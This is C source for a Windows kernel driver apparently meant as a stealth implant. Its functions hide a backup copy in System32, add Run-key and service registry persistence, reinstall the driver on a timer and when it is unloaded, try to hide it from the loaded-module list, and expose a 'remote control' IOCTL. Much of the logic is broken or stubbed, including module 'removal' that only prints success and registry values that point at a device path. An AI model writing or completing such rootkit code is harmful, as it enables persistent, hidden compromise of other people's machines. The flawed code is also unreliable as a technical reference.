#include <ntddk.h>
#include <ntstrsafe.h>
#include <wdf.h>

#define BACKUP_PATH L"\\??\\C:\\BackupDriver.sys"
#define HIDDEN_BACKUP_PATH L"\\??\\C:\\Windows\\System32\\HiddenBackup.sys"
#define SERVICE_NAME L"MyHiddenService"

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

#define IOCTL_REMOTE_CONTROL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define REINSTALL_TIMEOUT 5000 // Timeout in milliseconds for reinstallation

// Function declarations
NTSTATUS DriverControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS CreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject);
VOID SelfRepair(IN PDRIVER_OBJECT DriverObject);
VOID TimerDpcRoutine(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2);
VOID InstallRegistryPersistence(IN PDRIVER_OBJECT DriverObject);
VOID HideDriver(PDRIVER_OBJECT DriverObject);
VOID RemoveFromLoadedModulesList(PDRIVER_OBJECT DriverObject);
VOID HideDeviceObject(PDRIVER_OBJECT DriverObject);
VOID UnlinkDriverFromModuleList(PDRIVER_OBJECT DriverObject);

#define MAX_PATH 260

VOID CreateDriverBackup(VOID)
{
    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;
    UNICODE_STRING backupPath;

    RtlInitUnicodeString(&backupPath, HIDDEN_BACKUP_PATH);

    InitializeObjectAttributes(
        &objectAttributes,
        &backupPath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    status = ZwCreateFile(
        &fileHandle,
        GENERIC_WRITE | GENERIC_READ,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_CREATE,
        FILE_NON_DIRECTORY_FILE,
        NULL,
        0
    );

    if (NT_SUCCESS(status)) {
        DbgPrint("[+] File created/opened successfully.\n");
        ZwClose(fileHandle);
    }
    else {
        DbgPrint("[-] Failed to create/open file. Status: 0x%X\n", status);
    }
}

// ###############################################

VOID 
HideBackupFile(VOID)
{
    HANDLE fileHandle;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;
    UNICODE_STRING backupPath;

    RtlInitUnicodeString(&backupPath, HIDDEN_BACKUP_PATH);

    InitializeObjectAttributes(
        &objectAttributes,
        &backupPath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    status = ZwOpenFile(
        &fileHandle,
        GENERIC_READ | GENERIC_WRITE,
        &objectAttributes,
        &ioStatusBlock,
        FILE_SHARE_READ,
        FILE_NON_DIRECTORY_FILE
    );

    if (NT_SUCCESS(status)) {
        FILE_BASIC_INFORMATION fileBasicInfo;
        status = ZwQueryInformationFile(fileHandle, &ioStatusBlock, &fileBasicInfo, sizeof(fileBasicInfo), FileBasicInformation);
        if (NT_SUCCESS(status)) {
            fileBasicInfo.FileAttributes |= FILE_ATTRIBUTE_HIDDEN;
            status = ZwSetInformationFile(fileHandle, &ioStatusBlock, &fileBasicInfo, sizeof(fileBasicInfo), FileBasicInformation);
            if (NT_SUCCESS(status)) {
                DbgPrint("[+] Backup file hidden successfully.\n");
            }
            else {
                DbgPrint("[-] Failed to hide backup file. Status: 0x%X\n", status);
            }
        }
        else {
            DbgPrint("[-] Failed to query file information. Status: 0x%X\n", status);
        }

        ZwClose(fileHandle);
    }
    else {
        DbgPrint("[-] Failed to open backup file. Status: 0x%X\n", status);
    }
}

// ###############################################


VOID 
RestoreDriverFromBackup(VOID)
{
    HANDLE backupHandle;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;

    UNICODE_STRING backupPath;
    RtlInitUnicodeString(&backupPath, HIDDEN_BACKUP_PATH);

    // Initialize object attributes for opening the backup file
    InitializeObjectAttributes(&objectAttributes, &backupPath, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);
    status = ZwCreateFile(&backupHandle, GENERIC_READ, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to open backup file.\n");
        return;
    }

    HANDLE fileHandle;
    UNICODE_STRING devicePath;
    RtlInitUnicodeString(&devicePath, L"\\Device\\RemoteControlDevice");

    // Initialize object attributes for creating or opening the device file
    InitializeObjectAttributes(&objectAttributes, &devicePath, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);
    status = ZwCreateFile(&fileHandle, GENERIC_WRITE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (NT_SUCCESS(status)) {
        BYTE buffer[4096];
        ULONG bytesRead;

        while (NT_SUCCESS(status = ZwReadFile(backupHandle, NULL, NULL, NULL, &ioStatusBlock, buffer, sizeof(buffer), NULL, NULL))) {
            bytesRead = (ULONG)ioStatusBlock.Information;
            if (bytesRead == 0) break;

            ZwWriteFile(fileHandle, NULL, NULL, NULL, &ioStatusBlock, buffer, bytesRead, NULL, NULL);
        }

        ZwClose(fileHandle);
    }
    else {
        DbgPrint("[-] Failed to create device file from backup.\n");
    }

    ZwClose(backupHandle);
}

// Timer-related global variables
KTIMER g_Timer;
KDPC g_Dpc;
BOOLEAN g_TimerStarted = FALSE;

// Define necessary structures for NtQuerySystemInformation
typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    PVOID   Base;
    PVOID   EntryPoint;
    ULONG   Size;
    ULONG   Flags;
    USHORT  LoadCount;
    USHORT  ModuleNameOffset;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG   ModulesCount;
    SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

extern NTSTATUS NTAPI ZwQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

VOID ObscureDriverFromModuleList(PDRIVER_OBJECT DriverObject)
{
    ULONG bufferSize = 0x10000; // 64KB
    PVOID buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
    if (!buffer) {
        DbgPrint("[-] Failed to allocate memory for module list.\n");
        return;
    }

    ULONG returnLength = 0;
    NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &returnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        ExFreePoolWithTag(buffer, 'modl');
        bufferSize = returnLength;
        buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
        if (!buffer) {
            DbgPrint("[-] Failed to allocate memory for module list.\n");
            return;
        }

        status = ZwQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &returnLength);
    }

    if (NT_SUCCESS(status)) {
        PSYSTEM_MODULE_INFORMATION moduleInfo = (PSYSTEM_MODULE_INFORMATION)buffer;
        for (ULONG i = 0; i < moduleInfo->ModulesCount; i++) {
            PSYSTEM_MODULE_INFORMATION_ENTRY moduleEntry = &moduleInfo->Modules[i];
            if (moduleEntry->Base == DriverObject->DriverSection) {
                // Remove the driver from the list
                // Implementation of removal is specific to needs
                DbgPrint("[+] Driver obscured from module list.\n");
                break;
            }
        }
    }
    else {
        DbgPrint("[-] Failed to query system information.\n");
    }

    ExFreePoolWithTag(buffer, 'modl');
}

VOID 
UnlinkDriverFromModuleList
(PDRIVER_OBJECT DriverObject)
{
    ULONG bufferSize = 0x10000; // 64KB
    PVOID buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
    if (!buffer) {
        DbgPrint("[-] Failed to allocate memory for module list.\n");
        return;
    }

    ULONG returnLength = 0;
    NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &returnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        ExFreePoolWithTag(buffer, 'modl');
        bufferSize = returnLength;
        buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
        if (!buffer) {
            DbgPrint("[-] Failed to allocate memory for module list.\n");
            return;
        }

        status = ZwQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &returnLength);
    }

    if (NT_SUCCESS(status)) {
        PSYSTEM_MODULE_INFORMATION moduleInfo = (PSYSTEM_MODULE_INFORMATION)buffer;
        for (ULONG i = 0; i < moduleInfo->ModulesCount; i++) {
            PSYSTEM_MODULE_INFORMATION_ENTRY moduleEntry = &moduleInfo->Modules[i];
            if (moduleEntry->Base == DriverObject->DriverSection) {
                // Perform removal from the list here
                // This code should be implemented based on specific needs
                DbgPrint("[+] Driver removed from module list.\n");
                break;
            }
        }
    }
    else {
        DbgPrint("[-] Failed to query system information.\n");
    }

    ExFreePoolWithTag(buffer, 'modl');
}

VOID 
RemoveFromLoadedModulesList
(PDRIVER_OBJECT DriverObject)
{
    ULONG bufferSize = 0x10000; // 64KB
    PVOID buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
    if (!buffer) {
        DbgPrint("[-] Failed to allocate memory for module list.\n");
        return;
    }

    ULONG returnLength = 0;
    NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &returnLength);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        ExFreePool2(buffer, 0, NULL, 0);
        bufferSize = returnLength;
        buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'modl');
        if (!buffer) {
            DbgPrint("[-] Failed to allocate memory for module list.\n");
            return;
        }

        status = ZwQuerySystemInformation(SystemModuleInformation, buffer, bufferSize, &returnLength);
    }

    if (NT_SUCCESS(status)) {
        PSYSTEM_MODULE_INFORMATION moduleInfo = (PSYSTEM_MODULE_INFORMATION)buffer;
        for (ULONG i = 0; i < moduleInfo->ModulesCount; i++) {
            PSYSTEM_MODULE_INFORMATION_ENTRY moduleEntry = &moduleInfo->Modules[i];
            if (moduleEntry->Base == DriverObject->DriverSection) {
                // Remove the driver from the list
                // Actual removal is not implemented here due to complexity
                DbgPrint("[+] Driver removed from loaded modules list.\n");
                break;
            }
        }
    }
    else {
        DbgPrint("[-] Failed to query system information.\n");
    }

    ExFreePool2(buffer, 0, NULL, 0); // Use ExFreePool2 for memory deallocation
}

// Function to handle registry persistence
VOID InstallRegistryPersistence(IN PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject); // Suppress warning about unused parameter

    UNICODE_STRING keyName = RTL_CONSTANT_STRING(L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    HANDLE keyHandle;
    OBJECT_ATTRIBUTES objectAttributes;
    NTSTATUS status;
    UNICODE_STRING valueName = RTL_CONSTANT_STRING(L"MyHiddenDriver");

    InitializeObjectAttributes(&objectAttributes, &keyName, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);

    status = ZwOpenKey(&keyHandle, KEY_SET_VALUE, &objectAttributes);
    if (NT_SUCCESS(status)) {
        WCHAR path[512];
        UNICODE_STRING driverPath;
        RtlStringCbPrintfW(path, sizeof(path), L"\\Device\\RemoteControlDevice");
        RtlInitUnicodeString(&driverPath, path);

        status = ZwSetValueKey(keyHandle, &valueName, 0, REG_SZ, driverPath.Buffer, driverPath.Length + sizeof(WCHAR));
        ZwClose(keyHandle);

        if (NT_SUCCESS(status)) {
            DbgPrint("[+] Registry persistence set up.\n");
        }
        else {
            DbgPrint("[-] Failed to set registry persistence.\n");
        }
    }
    else {
        DbgPrint("[-] Failed to open registry key.\n");
    }
}
extern PDRIVER_OBJECT g_DriverObject;
PDRIVER_OBJECT g_DriverObject = NULL;

VOID 
InstallServicePersistence
(IN PDRIVER_OBJECT DriverObject);

VOID 
InstallServicePersistence
(IN PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING serviceName = RTL_CONSTANT_STRING(SERVICE_NAME);
    WCHAR path[MAX_PATH];
    UNICODE_STRING driverPath;
    HANDLE serviceKey;
    OBJECT_ATTRIBUTES objectAttributes;
    NTSTATUS status;

    // Initialize the path to the driver
    RtlStringCbPrintfW(path, sizeof(path), L"\\Device\\RemoteControlDevice");
    RtlInitUnicodeString(&driverPath, path);

    // Create or open the service key
    InitializeObjectAttributes(&objectAttributes, &serviceName, OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, NULL);
    status = ZwOpenKey(&serviceKey, KEY_SET_VALUE, &objectAttributes);
    if (NT_SUCCESS(status)) {
        status = ZwSetValueKey(serviceKey, &serviceName, 0, REG_SZ, driverPath.Buffer, driverPath.Length + sizeof(WCHAR));
        ZwClose(serviceKey);

        if (NT_SUCCESS(status)) {
            DbgPrint("[+] Service persistence set up.\n");
        }
        else {
            DbgPrint("[-] Failed to set service persistence.\n");
        }
    }
    else {
        DbgPrint("[-] Failed to open service registry key.\n");
    }
}

// Function to handle self-repair and re-installation
VOID SelfRepair(IN PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RemoteControlDevice");
    UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\RemoteControlLink");

    // Backup the driver image
    CreateDriverBackup();

    // Remove the driver
    HideDeviceObject(DriverObject);

    // Recreate the device and symbolic link
    PDEVICE_OBJECT deviceObject = NULL;
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (NT_SUCCESS(status)) {
        status = IoCreateSymbolicLink(&symbolicLink, &deviceName);
        if (NT_SUCCESS(status)) {
            DbgPrint("[+] Device and symbolic link re-created successfully.\n");
        }
        else {
            DbgPrint("[-] Failed to re-create symbolic link.\n");
            IoDeleteDevice(deviceObject);
        }
    }
    else {
        DbgPrint("[-] Failed to re-create device.\n");
    }

    // Restore from backup if needed
    RestoreDriverFromBackup();

    // Reapply hiding techniques and persistence
    HideDriver(DriverObject);
    InstallRegistryPersistence(DriverObject);
    InstallServicePersistence(DriverObject);
}

// Function to unload the driver with a self-repair mechanism
VOID UnloadDriver(IN PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    g_DriverObject = DriverObject;
    DbgPrint("[-] Unloading driver.\n");

    // Attempt to self-repair if unloading is initiated
    if (g_DriverObject != NULL) {
        SelfRepair(g_DriverObject);
    }
    else {
        DbgPrint("[-] g_DriverObject is NULL.\n");
    }
}

// Timer DPC routine for reinstallation and persistence
VOID TimerDpcRoutine(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    // Self-repair or reinstall driver
    SelfRepair(g_DriverObject); // Ensure g_DriverObject is of type PDRIVER_OBJECT
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RemoteControlDevice");
    UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(L"\\??\\RemoteControlLink");

    PDEVICE_OBJECT deviceObject = NULL;
    NTSTATUS status;

    DriverObject->DriverUnload = UnloadDriver;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverControl;

    status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to create device.\n");
        return status;
    }

    status = IoCreateSymbolicLink(&symbolicLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Failed to create symbolic link.\n");
        IoDeleteDevice(deviceObject);
        return status;
    }

    // Set up the timer for self-repair
    KeInitializeTimer(&g_Timer);
    KeInitializeDpc(&g_Dpc, TimerDpcRoutine, NULL);

    // Start the timer
    LARGE_INTEGER dueTime;
    dueTime.QuadPart = -REINSTALL_TIMEOUT * 10000; // Convert milliseconds to 100-nanosecond units
    KeSetTimer(&g_Timer, dueTime, &g_Dpc);
    g_TimerStarted = TRUE;

    // Install registry persistence
    InstallRegistryPersistence(DriverObject);

    // Install service persistence
    InstallServicePersistence(DriverObject);

    // Hide the backup file
    HideBackupFile();

    // Obscure the driver from the module list
    ObscureDriverFromModuleList(DriverObject);

    DbgPrint("[+] Driver loaded and persistence set.\n");

    return STATUS_SUCCESS;
}

NTSTATUS DriverControl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;

    switch (irpSp->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_REMOTE_CONTROL:
        DbgPrint("[+] IOCTL_REMOTE_CONTROL received.\n");
        // Handle the IOCTL request
        break;
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS CreateClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

VOID HideDriver(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RemoteControlDevice");

    // Hide the device object
    HideDeviceObject(DriverObject);
    DbgPrint("[+] Driver hidden.\n");
}

VOID HideDeviceObject(PDRIVER_OBJECT DriverObject)
{
    PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
    while (deviceObject) {
        UNICODE_STRING symbolicLinkName;
        RtlInitUnicodeString(&symbolicLinkName, L"\\??\\RemoteControlLink");
        IoDeleteSymbolicLink(&symbolicLinkName);
        deviceObject = deviceObject->NextDevice;
    }
}
